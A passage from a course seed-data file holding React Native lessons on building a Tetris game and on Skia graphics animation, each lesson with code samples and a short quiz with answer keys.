          answer: 'Every move (left/right/rotate/down) reuses the same function to test whether a proposed new position is legal before committing to it',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Returning clearInterval from a useEffect cleanup function prevents multiple overlapping intervals from stacking up.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The row/col fields on ActivePiece track the position of the shape\'s ____-____ corner on the board.',
          options: [],
          answer: 'top-left',
        },
      ],
    },
  },
  {
    title: 'Touch Controls: Move, Rotate, and Drop',
    content: lessonContent(
      'Touch Controls: Move, Rotate, and Drop',
      `With gravity and collision working, this lesson wires up the controls a player actually taps: move left/right, rotate, and drop.\n\n## Move and rotate handlers\n\n\`\`\`tsx\nfunction useTetris() {\n  const [board] = useState<Matrix>(createEmptyBoard);\n  const [piece, setPiece] = useState<ActivePiece>(() => spawnPiece('T'));\n\n  function tryMove(deltaRow: number, deltaCol: number) {\n    setPiece((current) => {\n      const newRow = current.row + deltaRow;\n      const newCol = current.col + deltaCol;\n      if (hasCollision(board, current, newRow, newCol)) return current; // illegal, stay put\n      return { ...current, row: newRow, col: newCol };\n    });\n  }\n\n  function tryRotate() {\n    setPiece((current) => {\n      const rotatedShape = rotate(current.shape);\n      const rotated = { ...current, shape: rotatedShape };\n      if (hasCollision(board, rotated, current.row, current.col)) return current; // would overlap, cancel\n      return rotated;\n    });\n  }\n\n  return { board, piece, tryMove, tryRotate };\n}\n\`\`\`\n\nBoth functions follow the same shape as \`hasCollision\` from the last lesson: compute what the piece *would* look like, check it, and only apply the change if it's legal. Using the **updater form** of \`setPiece\` (\`setPiece((current) => ...)\`) rather than reading \`piece\` directly matters here, it guarantees you're always checking against the truly current state, even if multiple moves happen in quick succession before a re-render.\n\n## On-screen buttons\n\n\`\`\`tsx\nimport { View, TouchableOpacity, Text, StyleSheet } from 'react-native';\n\nfunction Controls({ onLeft, onRight, onRotate, onDrop }: {\n  onLeft: () => void;\n  onRight: () => void;\n  onRotate: () => void;\n  onDrop: () => void;\n}) {\n  return (\n    <View style={styles.row}>\n      <TouchableOpacity style={styles.button} onPress={onLeft}><Text style={styles.label}>◀</Text></TouchableOpacity>\n      <TouchableOpacity style={styles.button} onPress={onRotate}><Text style={styles.label}>⟳</Text></TouchableOpacity>\n      <TouchableOpacity style={styles.button} onPress={onDrop}><Text style={styles.label}>▼</Text></TouchableOpacity>\n      <TouchableOpacity style={styles.button} onPress={onRight}><Text style={styles.label}>▶</Text></TouchableOpacity>\n    </View>\n  );\n}\n\nconst styles = StyleSheet.create({\n  row: { flexDirection: 'row', justifyContent: 'space-around', padding: 16 },\n  button: { backgroundColor: '#1e293b', borderRadius: 12, paddingVertical: 14, paddingHorizontal: 20 },\n  label: { color: '#fff', fontSize: 20 },\n});\n\`\`\`\n\n\`TouchableOpacity\` is React Native's tappable-button-with-a-fade-feedback component, roughly the mobile equivalent of a styled \`<button>\` on the web. Each button just calls one of the handler functions from \`useTetris\`, \`onLeft={() => tryMove(0, -1)}\`, \`onRight={() => tryMove(0, 1)}\`, \`onDrop={() => tryMove(1, 0)}\`, \`onRotate={tryRotate}\`.\n\n> [!TIP]\n> Simple on-screen buttons like this are the easiest way to get Tetris fully playable on a touchscreen. Swipe gestures (via \`react-native-gesture-handler\`) feel more natural for a polished version, that's one of this course's final project stretch goals.`
    ),
    quiz: {
      title: 'Touch Controls Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does tryMove() use the updater form setPiece((current) => ...) instead of reading piece directly?',
          options: [
            "It's required syntax in React Native specifically",
            'It guarantees the collision check runs against the truly current state, even if multiple moves happen in quick succession',
            'It makes the component render faster',
            'There is no real difference',
          ],
          answer: 'It guarantees the collision check runs against the truly current state, even if multiple moves happen in quick succession',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'TouchableOpacity is roughly the mobile equivalent of a styled <button> on the web.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'tryRotate() computes a rotated shape, checks it with hasCollision(), and only applies it if there is no ____.',
          options: [],
          answer: 'collision',
        },
      ],
    },
  },
  {
    title: 'Locking Pieces and Clearing Lines',
    content: lessonContent(
      'Locking Pieces and Clearing Lines',
      `When a falling piece can't move down any further, it needs to permanently **lock** into the board, and any completely filled rows need to disappear. This is the heart of Tetris's core loop.\n\n## Locking a piece into the board\n\n\`\`\`\nfunction lockPiece(board: Matrix, piece: ActivePiece): Matrix {\n  const newBoard = board.map((row) => [...row]); // copy, never mutate the board in place\n  const colorId = SHAPE_COLORS[piece.shapeName];\n\n  for (let r = 0; r < piece.shape.length; r++) {\n    for (let c = 0; c < piece.shape[r].length; c++) {\n      if (!piece.shape[r][c]) continue;\n      const boardRow = piece.row + r;\n      const boardCol = piece.col + c;\n      if (boardRow >= 0) newBoard[boardRow][boardCol] = colorId;\n    }\n  }\n\n  return newBoard;\n}\n\`\`\`\n\n\`board.map((row) => [...row])\` makes a **deep-enough** copy, a new outer array *and* new inner row arrays, so writing into \`newBoard\` never mutates the \`board\` that was passed in. This matters for the same reason \`createEmptyBoard\`'s \`Array.from\` mattered: React needs a genuinely new array reference to know something changed and re-render.\n\n## Finding and clearing full rows\n\n\`\`\`\nfunction clearFullRows(board: Matrix): { board: Matrix; linesCleared: number } {\n  const remainingRows = board.filter((row) => row.some((cell) => cell === 0));\n  const linesCleared = BOARD_HEIGHT - remainingRows.length;\n\n  const emptyRows = Array.from({ length: linesCleared }, () => Array(BOARD_WIDTH).fill(0));\n  return { board: [...emptyRows, ...remainingRows], linesCleared };\n}\n\`\`\`\n\n\`row.some((cell) => cell === 0)\` is true for any row with **at least one** empty cell, so \`board.filter(...)\` keeps only the rows that are *not* completely full, exactly the rows that survive a line clear. Prepending fresh empty rows (\`[...emptyRows, ...remainingRows]\`) at the **top** is what makes everything above a cleared line visually fall down, the surviving rows just end up lower in the new array.\n\n## Wiring it into the tick\n\n\`\`\`\nfunction handleTick(board: Matrix, piece: ActivePiece) {\n  if (!hasCollision(board, piece, piece.row + 1, piece.col)) {\n    return { board, piece: { ...piece, row: piece.row + 1 }, linesCleared: 0 };\n  }\n\n  // can't fall further: lock it, clear lines, spawn the next piece\n  const locked = lockPiece(board, piece);\n  const { board: clearedBoard, linesCleared } = clearFullRows(locked);\n  const nextPiece = spawnPiece(randomShapeName());\n  return { board: clearedBoard, piece: nextPiece, linesCleared };\n}\n\`\`\`\n\nEvery tick asks one question: can the piece move down one more row? If yes, just move it, business as usual. If no, that's the signal the piece has landed, lock it, clear whatever rows are now full, and spawn a fresh piece to keep the game going.\n\n> [!NOTE]\n> \`randomShapeName()\` here just needs to return one of \`'I' | 'O' | 'T' | 'S' | 'Z' | 'J' | 'L'\`, a simple \`Math.random()\`-based picker works, but produces streaky, unfair randomness (you could see the same piece five times in a row), the "Next Piece and the 7-Bag" lesson replaces it with the fairer system real Tetris games use.`
    ),
    quiz: {
      title: 'Locking and Line Clears Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does row.some((cell) => cell === 0) identify?',
          options: [
            'A row that is completely full',
            'A row with at least one empty cell, i.e. NOT eligible for clearing',
            'A row that is completely empty',
            'The current piece\'s row',
          ],
          answer: 'A row with at least one empty cell, i.e. NOT eligible for clearing',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'lockPiece() mutates the board array that was passed into it directly, rather than returning a copy.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prepending fresh empty rows at the top of the board (rather than the bottom) is what makes rows above a clear visually ____ down.',
          options: [],
          answer: 'fall',
        },
      ],
    },
  },
  {
    title: 'Scoring, Levels, and Game Over',
    content: lessonContent(
      'Scoring, Levels, and Game Over',
      `A line-clearing board isn't quite a full game yet, it needs a score, a sense of progression as levels speed things up, and a way to know when it's over.\n\n## Classic scoring\n\n\`\`\`\nconst LINE_SCORES = [0, 100, 300, 500, 800]; // index = number of lines cleared at once\n\nfunction scoreForLines(linesCleared: number, level: number): number {\n  return LINE_SCORES[linesCleared] * (level + 1);\n}\n\`\`\`\n\nClearing 4 lines at once (a **Tetris**, the move the game is named after) is worth far more than 4x a single line (800 vs. 100), this is deliberate in the original game design, it rewards setting up multi-line clears instead of clearing lines one at a time. Multiplying by \`(level + 1)\` makes higher levels worth more points for the same clear, on top of the game already being faster and harder there.\n\n## Leveling up and speeding up\n\n\`\`\`\nfunction levelForLines(totalLinesCleared: number): number {\n  return Math.floor(totalLinesCleared / 10); // level up every 10 lines\n}\n\nfunction speedForLevel(level: number): number {\n  return Math.max(100, 1000 - level * 75); // ms per tick, capped so it never gets impossibly fast\n}\n\`\`\`\n\n\`speedForLevel\` feeds directly into the \`useGameLoop\` hook's \`speedMs\` from the game loop lesson, as \`level\` climbs, the interval between ticks shrinks, gravity pulls pieces down faster. \`Math.max(100, ...)\` puts a floor on how fast it can get, without it, the formula would eventually produce a negative or absurdly tiny interval.\n\n## Detecting game over\n\n\`\`\`\nfunction isGameOver(board: Matrix, newPiece: ActivePiece): boolean {\n  return hasCollision(board, newPiece, newPiece.row, newPiece.col);\n}\n\`\`\`\n\nThe game is over the instant a **freshly spawned** piece already collides with something at its starting position, meaning the stack has reached all the way to the top, there's nowhere left to put a new piece. Check this right after spawning each new piece in the tick handler from the previous lesson, before letting the game loop continue.\n\n\`\`\`\nconst nextPiece = spawnPiece(randomShapeName());\nif (isGameOver(clearedBoard, nextPiece)) {\n  // stop the interval, show a game over screen\n}\n\`\`\`\n\n> [!TIP]\n> Track \`totalLinesCleared\` as a running total across the whole game (not just the current tick), \`levelForLines\` needs the cumulative count to know when a level threshold has actually been crossed.`
    ),
    quiz: {
      title: 'Scoring and Game Over Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why is clearing 4 lines at once (800 points) worth more than 4x a single line clear (4 x 100 = 400)?',
          options: [
            'It is a bug in the scoring formula',
            "It's a deliberate design choice that rewards setting up multi-line clears over clearing one line at a time",
            'Four-line clears take longer to compute',
            'There is no difference, LINE_SCORES is linear',
          ],
          answer: "It's a deliberate design choice that rewards setting up multi-line clears over clearing one line at a time",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The game is detected as over the instant a freshly spawned piece already collides with the board at its starting position.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Math.max(100, 1000 - level * 75) puts a ____ on how fast the tick speed can get as the level increases.',
          options: [],
          answer: 'floor',
        },
      ],
    },
  },
  {
    title: 'Next Piece Preview and the 7-Bag',
    content: lessonContent(
      'Next Piece Preview and the 7-Bag',
      `A plain \`Math.random()\` piece picker is technically fair over a long enough game, but in the short term it can feel unfair, streaks of the same piece, or an agonizingly long drought without the I-piece you need. Modern Tetris games solve this with the **7-bag randomizer**, and show players what's coming next.\n\n## The 7-bag algorithm\n\n\`\`\`\nfunction shuffle<T>(items: T[]): T[] {\n  const copy = [...items];\n  for (let i = copy.length - 1; i > 0; i--) {\n    const j = Math.floor(Math.random() * (i + 1));\n    [copy[i], copy[j]] = [copy[j], copy[i]];\n  }\n  return copy;\n}\n\nfunction createBag(): string[] {\n  return shuffle(['I', 'O', 'T', 'S', 'Z', 'J', 'L']);\n}\n\`\`\`\n\nThe idea: shuffle all 7 shapes into a random order, a "bag", and deal pieces out of it one at a time. Once the bag is empty, shuffle a fresh set of all 7 and keep going. This guarantees you see every shape exactly once every 7 pieces, no droughts, no unfair streaks, while each individual bag's *order* is still genuinely random.\n\n\`shuffle\` itself is the **Fisher-Yates shuffle**, the standard unbiased way to randomly order a list: walk backwards from the end, and for each position, swap it with a random earlier-or-equal position. \`[copy[i], copy[j]] = [copy[j], copy[i]]\` is a destructuring swap, JavaScript's idiom for exchanging two variables (or array slots) without a temporary variable.\n\n## Managing the piece queue\n\n\`\`\`\nfunction usePieceQueue() {\n  const [queue, setQueue] = useState<string[]>(() => [...createBag(), ...createBag()]);\n\n  function takeNext(): string {\n    const [next, ...rest] = queue;\n    const refilled = rest.length <= 7 ? [...rest, ...createBag()] : rest;\n    setQueue(refilled);\n    return next;\n  }\n\n  return { next: queue[0], takeNext };\n}\n\`\`\`\n\nStarting with **two** bags concatenated together (\`[...createBag(), ...createBag()]\`) guarantees there's always at least one full bag's worth of pieces ahead to peek at for a "Next" preview, even right after a refill. \`takeNext\` removes the front piece, tops the queue back up with a fresh bag once it runs low, and returns the piece that's now active.\n\n## The "Next" preview\n\n\`\`\`tsx\nfunction NextPreview({ shapeName }: { shapeName: string }) {\n  const shape = SHAPES[shapeName];\n  return (\n    <View style={styles.preview}>\n      {shape.map((row, r) => (\n        <View key={r} style={{ flexDirection: 'row' }}>\n          {row.map((cell, c) => (\n            <View key={c} style={[styles.miniCell, cell !== 0 && styles.filled]} />\n          ))}\n        </View>\n      ))}\n    </View>\n  );\n}\n\`\`\`\n\nThis reuses the exact same rendering pattern as the main \`Board\` component, a shape matrix is really just a tiny board, so the same nested-\`View\`-rows approach works for both.\n\n> [!NOTE]\n> \`queue[0]\` (peeking without removing) is what the \`NextPreview\` component should render, only \`takeNext()\` (called from the tick handler when spawning) actually advances the queue.`
    ),
    quiz: {
      title: '7-Bag and Next Piece Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What problem does the 7-bag randomizer solve compared to plain Math.random() piece selection?',
          options: [
            'It makes the game run faster',
            'It guarantees every shape appears exactly once every 7 pieces, avoiding unfair streaks or long droughts',
            'It reduces memory usage',
            'It is required for touch controls to work',
          ],
          answer: 'It guarantees every shape appears exactly once every 7 pieces, avoiding unfair streaks or long droughts',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The shuffle() function shown is the Fisher-Yates shuffle, the standard unbiased way to randomly order a list.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '[copy[i], copy[j]] = [copy[j], copy[i]] is a ____ swap, exchanging two array slots without a temporary variable.',
          options: [],
          answer: 'destructuring',
        },
      ],
    },
  },
  {
    title: 'Final Project: Complete Your Tetris Game',
    content: lessonContent(
      'Final Project: Complete Your Tetris Game',
      `Every piece from this course now exists on its own: the board, all 7 tetrominoes with rotation, gravity, collision, touch controls, locking, line-clearing, scoring, levels, game over, and a fair 7-bag piece queue. This final project assembles all of it into one complete, playable Tetris screen.\n\n## Requirements\n\nYour finished \`app/tetris.tsx\` screen should satisfy every one of these:\n\n1. Creates a 10x20 board using \`createEmptyBoard()\` and renders it with the nested-\`View\` grid pattern.\n2. Spawns tetrominoes from the 7-bag queue (\`usePieceQueue\`), not plain \`Math.random()\`, and shows a "Next" preview of the upcoming piece.\n3. Runs a game loop (\`useGameLoop\`) that moves the active piece down automatically, at a speed that increases with the level.\n4. Provides on-screen touch controls for move left, move right, rotate, and soft drop, each going through \`hasCollision()\` before being applied.\n5. Locks a piece into the board when it can no longer fall (\`lockPiece\`), clears any completed rows (\`clearFullRows\`), and updates score/level based on lines cleared.\n6. Detects game over when a freshly spawned piece immediately collides, stops the game loop, and shows a game over message with the final score.\n\nBringing every earlier lesson's pieces together into one screen (state, game loop, controls, and rendering) is the whole project:\n\n\`\`\`tsx\nimport { useCallback, useState } from 'react';\nimport { View, Text, StyleSheet } from 'react-native';\n\nexport default function TetrisScreen() {\n  const [board, setBoard] = useState<Matrix>(createEmptyBoard);\n  const [piece, setPiece] = useState<ActivePiece>(() => spawnPiece('T'));\n  const [score, setScore] = useState(0);\n  const [totalLines, setTotalLines] = useState(0);\n  const [gameOver, setGameOver] = useState(false);\n  const { next, takeNext } = usePieceQueue();\n\n  const level = levelForLines(totalLines);\n\n  const tick = useCallback(() => {\n    if (gameOver) return;\n    if (!hasCollision(board, piece, piece.row + 1, piece.col)) {\n      setPiece((p) => ({ ...p, row: p.row + 1 }));\n      return;\n    }\n    const locked = lockPiece(board, piece);\n    const { board: cleared, linesCleared } = clearFullRows(locked);\n    const nextPiece = spawnPiece(takeNext());\n\n    if (isGameOver(cleared, nextPiece)) {\n      setBoard(cleared);\n      setGameOver(true);\n      return;\n    }\n\n    setBoard(cleared);\n    setPiece(nextPiece);\n    setScore((s) => s + scoreForLines(linesCleared, level));\n    setTotalLines((t) => t + linesCleared);\n  }, [board, piece, gameOver, level, takeNext]);\n\n  useGameLoop(speedForLevel(level), tick);\n\n  return (\n    <View style={styles.screen}>\n      <Text style={styles.score}>Score: {score}</Text>\n      <Board board={renderPieceOnBoard(board, piece)} />\n      <NextPreview shapeName={next} />\n      <Controls\n        onLeft={() => tryMove(0, -1)}\n        onRight={() => tryMove(0, 1)}\n        onRotate={tryRotate}\n        onDrop={() => tryMove(1, 0)}\n      />\n      {gameOver && <Text style={styles.gameOver}>Game Over! Final score: {score}</Text>}\n    </View>\n  );\n}\n\nconst styles = StyleSheet.create({\n  screen: { flex: 1, alignItems: 'center', paddingTop: 48, backgroundColor: '#0f172a' },\n  score: { color: '#fff', fontSize: 20, marginBottom: 12 },\n  gameOver: { color: '#f87171', fontSize: 18, marginTop: 16 },\n});\n\`\`\`\n\n\`renderPieceOnBoard(board, piece)\` (not shown, worth writing yourself) should return a **copy** of \`board\` with the active piece's cells overlaid on top, so the falling piece is visible before it locks, without mutating the real board state.\n\n## Stretch goals\n\n- Add a **hard drop**: instantly move the piece straight down (loop \`tryMove(1, 0)\` until it would collide) instead of waiting for gravity, common in modern Tetris as a fifth control.\n- Add a **ghost piece**: a faint outline showing where the current piece would land if hard-dropped, computed the same way as the hard drop, but only rendered, not actually moved.\n- Add a **hold piece**: let the player swap the active piece into a "held" slot once per drop, swapping it back in later.\n- Replace the on-screen buttons with **swipe gestures** using \`react-native-gesture-handler\`, swipe left/right to move, swipe down for soft drop, tap to rotate.\n- Persist the high score locally with \`@react-native-async-storage/async-storage\` so it survives closing the app.\n- Add sound effects for line clears and game over with \`expo-av\`.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const skiaLessons: SeedLesson[] = [
  {
    title: "Setting Up Skia: Canvas and Your First Shape",
    content: lessonContent(
      "Setting Up Skia: Canvas and Your First Shape",
      `Skia is the same 2D graphics engine that powers Chrome, Android, and Flutter, drawing directly on the GPU instead of going through React Native's normal \`View\`/\`Text\` tree. **React Native Skia** (\`@shopify/react-native-skia\`) brings that engine into your Expo app, and it's the tool of choice whenever you need buttery-smooth custom graphics or animation that plain React Native views can't keep up with.

## Installing Skia in an Expo app

\`\`\`bash
npx expo install @shopify/react-native-skia
\`\`\`

## The Canvas

Everything Skia draws lives inside a \`<Canvas>\`, a special component that owns its own GPU surface. Shapes are its children, described declaratively just like regular JSX:

\`\`\`tsx
import { Canvas, Circle } from '@shopify/react-native-skia';
import { StyleSheet } from 'react-native';

export function FirstShape() {
  return (
    <Canvas style={styles.canvas}>
      <Circle cx={100} cy={100} r={50} color="#22d3ee" />
    </Canvas>
  );
}

const styles = StyleSheet.create({
  canvas: { flex: 1 },
});
\`\`\`

\`cx\`/\`cy\` set the circle's center, \`r\` its radius, both in the Canvas's own coordinate space, not the screen, so a \`Canvas\` sized 300x300 has its own local (0,0) to (300,300) grid regardless of where it sits on screen.

> [!WARNING]
> A \`<Canvas>\` needs an explicit size (from \`style\` or a parent with a fixed size) to render anything. An unconstrained Canvas (e.g. inside a \`View\` with no \`flex\` or dimensions) draws nothing.

## Why not just use View and CSS-like styles?

Regular React Native views re-render through the normal React/Yoga layout pipeline on every change, fine for UI, too slow for continuous animation like particle effects or a physics-driven loading spinner. Skia shapes are drawn straight to the GPU and can update at 60-120fps without ever touching React's render cycle, that's the whole point of the rest of this course.`
    ),
    quiz: {
      title: "Skia Setup Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What package brings the Skia 2D graphics engine into a React Native/Expo app?",
          options: ["react-native-svg","@shopify/react-native-skia","react-native-reanimated","expo-gl"],
          answer: "@shopify/react-native-skia",
        },
        {
          type: 'FILL_BLANK',
          prompt: "Every shape Skia draws must be a child of the ____ component.",
          options: [],
          answer: "Canvas",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A Canvas with no explicit size will still render its shapes at a default 100x100 size.",
          options: ["True","False"],
          answer: "False",
        },
      ],
    },
  },
  {
    title: "Drawing Shapes and Paths",
    content: lessonContent(
      "Drawing Shapes and Paths",
      `Skia ships a handful of built-in shape components, and one flexible escape hatch, \`Path\`, for anything more custom.

## Built-in shapes

\`\`\`tsx
import { Canvas, Circle, Rect, RoundedRect } from '@shopify/react-native-skia';

export function Shapes() {
  return (
    <Canvas style={{ flex: 1 }}>
      <Circle cx={60} cy={60} r={40} color="#f97316" />
      <Rect x={140} y={20} width={80} height={80} color="#22c55e" />
      <RoundedRect x={20} y={140} width={100} height={60} r={16} color="#a855f7" />
    </Canvas>
  );
}
\`\`\`

Multiple shapes as siblings inside a \`Canvas\` are simply drawn in order, later children paint on top of earlier ones, exactly like layered \`View\`s.

## Fill vs. stroke

By default every shape is filled. Pass \`style="stroke"\` and a \`strokeWidth\` to draw just an outline instead:

\`\`\`tsx
<Circle cx={100} cy={100} r={50} color="#22d3ee" style="stroke" strokeWidth={4} />
\`\`\`

## Paths, for anything custom

\`Path\` takes an SVG-style path string, and Skia gives you \`Skia.Path.Make()\` to build one programmatically:

\`\`\`tsx
import { Canvas, Path, Skia } from '@shopify/react-native-skia';

const triangle = Skia.Path.Make();
triangle.moveTo(50, 0);
triangle.lineTo(100, 100);
triangle.lineTo(0, 100);
triangle.close();

export function Triangle() {
  return (
    <Canvas style={{ flex: 1 }}>
      <Path path={triangle} color="#facc15" />
    </Canvas>
  );
}
\`\`\`

\`moveTo\` lifts the "pen" to a starting point without drawing, \`lineTo\` draws a straight segment to the next point, and \`close()\` connects back to the start. Curves are available too, via \`cubicTo\`/\`quadTo\`, for anything that isn't made of straight lines.`
    ),
    quiz: {
      title: "Shapes & Paths Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "When two Skia shapes overlap, which one is drawn on top?",
          options: ["The larger one","The one declared later in JSX","The one declared first in JSX","Skia picks automatically based on color"],
          answer: "The one declared later in JSX",
        },
        {
          type: 'FILL_BLANK',
          prompt: "To draw just the outline of a shape instead of filling it, set style to ____.",
          options: [],
          answer: "stroke",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Skia.Path.Make() lets you build a custom shape out of straight lines and curves.",
          options: ["True","False"],
          answer: "True",
        },
      ],
    },
  },
  {
    title: "Animated Values: useValue, useComputedValue & runTiming",
    content: lessonContent(
      "Animated Values: useValue, useComputedValue & runTiming",
      `Updating shape props from \`useState\` works, but every change re-renders the component. Skia has its own lightweight value system that updates the GPU surface directly, skipping React entirely, which is how you get smooth 60fps+ animation.

## useValue

\`\`\`tsx
import { Canvas, Circle, useValue } from '@shopify/react-native-skia';

export function PulsingDot() {
  const radius = useValue(30);

  return (
    <Canvas style={{ flex: 1 }}>
      <Circle cx={100} cy={100} r={radius} color="#22d3ee" />
    </Canvas>
  );
}
\`\`\`

\`radius\` is a mutable "Skia value" (a \`SkiaValue<number>\`), passing it straight into \`r\` tells Skia to re-read \`radius.current\` on every frame, changing \`radius.current = 50\` updates the drawing immediately, with zero React re-render.

## Animating with runTiming

\`\`\`tsx
import { runTiming, Easing } from '@shopify/react-native-skia';

runTiming(radius, 60, { duration: 500, easing: Easing.inOut(Easing.ease) });
\`\`\`

\`runTiming(value, toValue, config)\` smoothly animates a Skia value from its current number to \`toValue\` over \`duration\` milliseconds, using the given easing curve, call it from a button press, a \`useEffect\`, or a gesture handler.

## Deriving one value from another

\`useComputedValue\` recomputes automatically whenever a value it depends on changes, useful for keeping two animated properties in sync without duplicating the animation:

\`\`\`tsx
import { useComputedValue } from '@shopify/react-native-skia';

const opacity = useComputedValue(() => radius.current / 60, [radius]);
\`\`\`

Here \`opacity\` always tracks \`radius\`, growing towards \`1\` as the circle grows towards its max radius, with no separate \`runTiming\` call needed for it.`
    ),
    quiz: {
      title: "Animated Values Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the main advantage of a Skia useValue over React's useState for animation?",
          options: ["It supports negative numbers","Updating it doesn't trigger a React re-render","It automatically loops forever","It only works with colors"],
          answer: "Updating it doesn't trigger a React re-render",
        },
        {
          type: 'FILL_BLANK',
          prompt: "____ animates a Skia value from its current number to a target value over a given duration.",
          options: [],
          answer: "runTiming",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "useComputedValue automatically recalculates whenever a Skia value it depends on changes.",
          options: ["True","False"],
          answer: "True",
        },
      ],
    },
  },
  {
    title: "Transforms: Translate, Rotate & Scale",
    content: lessonContent(
      "Transforms: Translate, Rotate & Scale",
      `Every Skia shape (and \`Group\` of shapes) accepts a \`transform\` prop, an array of transform operations applied in order, exactly like a CSS \`transform\` list.

## Transforming a single shape

\`\`\`tsx
<Rect x={0} y={0} width={40} height={40} color="#22d3ee" transform={[{ rotate: Math.PI / 4 }]} />
\`\`\`

Rotation is in **radians**, not degrees, \`Math.PI / 4\` is 45 degrees. By default a shape rotates/scales around its own top-left origin (0,0), use the \`origin\` prop to rotate around its actual center instead:

\`\`\`tsx
<Rect x={80} y={80} width={40} height={40} color="#f97316"
  origin={{ x: 100, y: 100 }}
  transform={[{ rotate: Math.PI / 4 }]}
/>
\`\`\`

## Grouping shapes

\`Group\` lets several shapes share one transform, moving and rotating together as a single unit, without repeating the same \`transform\` prop on each child:

\`\`\`tsx
import { Canvas, Group, Circle, Rect } from '@shopify/react-native-skia';

<Canvas style={{ flex: 1 }}>
  <Group transform={[{ translateX: 50 }, { translateY: 50 }, { scale: 1.5 }]}>
    <Circle cx={0} cy={0} r={20} color="#22d3ee" />
    <Rect x={-10} y={30} width={20} height={20} color="#f97316" />
  </Group>
</Canvas>
\`\`\`

## Animating a transform

Combine what you learned last lesson, drive the rotation off a \`useValue\` and animate it with \`runTiming\` for a continuously spinning shape:

\`\`\`tsx
const angle = useValue(0);

useEffect(() => {
  runTiming(angle, Math.PI * 2, { duration: 2000 }, () => {
    angle.current = 0;
  });
}, []);

// ...
<Group transform={[{ rotate: angle }]}>...</Group>
\`\`\``
    ),
    quiz: {
      title: "Transforms Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What unit does Skia's rotate transform use?",
          options: ["Degrees","Radians","Percent","Turns"],
          answer: "Radians",
        },
        {
          type: 'FILL_BLANK',
          prompt: "The ____ component lets multiple shapes share a single transform.",
          options: [],
          answer: "Group",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "By default, a shape rotates around its own center rather than its top-left origin.",
          options: ["True","False"],
          answer: "False",
        },
      ],
    },
  },
  {
    title: "Gestures: Dragging and Spring Animation",
    content: lessonContent(
      "Gestures: Dragging and Spring Animation",
      `Pairing Skia with \`react-native-gesture-handler\` is how you build draggable, physics-feeling graphics, a slider, a drag-to-dismiss card, or a springy button.

## Reading a pan gesture into a Skia value

\`\`\`tsx
import { Gesture, GestureDetector } from 'react-native-gesture-handler';
import { Canvas, Circle, useValue } from '@shopify/react-native-skia';

export function DraggableDot() {
  const cx = useValue(100);
  const cy = useValue(100);

  const pan = Gesture.Pan().onChange((e) => {
    cx.current += e.changeX;
    cy.current += e.changeY;
  });

  return (
    <GestureDetector gesture={pan}>
      <Canvas style={{ flex: 1 }}>
        <Circle cx={cx} cy={cy} r={30} color="#22d3ee" />
      </Canvas>
    </GestureDetector>
  );
}
\`\`\`

\`onChange\` fires on every frame of the gesture with the delta since the last event (\`changeX\`/\`changeY\`), adding that delta straight to the Skia values moves the circle in perfect sync with the finger, again with zero React re-renders.

## Springing back on release

\`runSpring\` animates a value using spring physics (mass, damping, stiffness) instead of a fixed duration, ideal for "let go and it snaps back":

\`\`\`tsx
import { runSpring } from '@shopify/react-native-skia';

const pan = Gesture.Pan()
  .onChange((e) => {
    cx.current += e.changeX;
    cy.current += e.changeY;
  })
  .onEnd(() => {
    runSpring(cx, 100, { mass: 1, damping: 10, stiffness: 150 });
    runSpring(cy, 100, { mass: 1, damping: 10, stiffness: 150 });
  });
\`\`\`

Higher \`damping\` settles faster with less bounce, higher \`stiffness\` snaps back faster, tune both to taste.`
    ),
    quiz: {
      title: "Gestures Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which gesture-handler event fires on every frame of a pan gesture with the movement delta?",
          options: ["onStart","onChange","onFinalize","onTouchesDown"],
          answer: "onChange",
        },
        {
          type: 'FILL_BLANK',
          prompt: "____ animates a Skia value using spring physics instead of a fixed duration.",
          options: [],
          answer: "runSpring",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Reading gesture deltas straight into a Skia useValue still causes a React re-render on every frame.",
          options: ["True","False"],
          answer: "False",
        },
      ],
    },
  },
  {
    title: "Final Project: Build an Animated Loading Spinner",
    content: lessonContent(
      "Final Project: Build an Animated Loading Spinner",
      `Time to combine shapes, animated values, transforms, and gestures into one real piece of UI: a custom animated loading spinner.

## Requirements

1. Render at least two Skia shapes inside a single \`Canvas\` (for example an outer ring built from a stroked \`Circle\` and an inner accent shape).
2. Drive a continuous rotation using a \`useValue\` and \`runTiming\`, looping forever (re-triggering the animation each time it completes, as shown in the transforms lesson).
3. Animate at least one more property besides rotation, radius, opacity, or color, using \`useComputedValue\` to derive it from your rotation value.
4. Add a tappable/draggable element (even a simple \`GestureDetector\` wrapping the whole \`Canvas\`) that triggers a \`runSpring\` animation, a "pulse" on tap is enough.
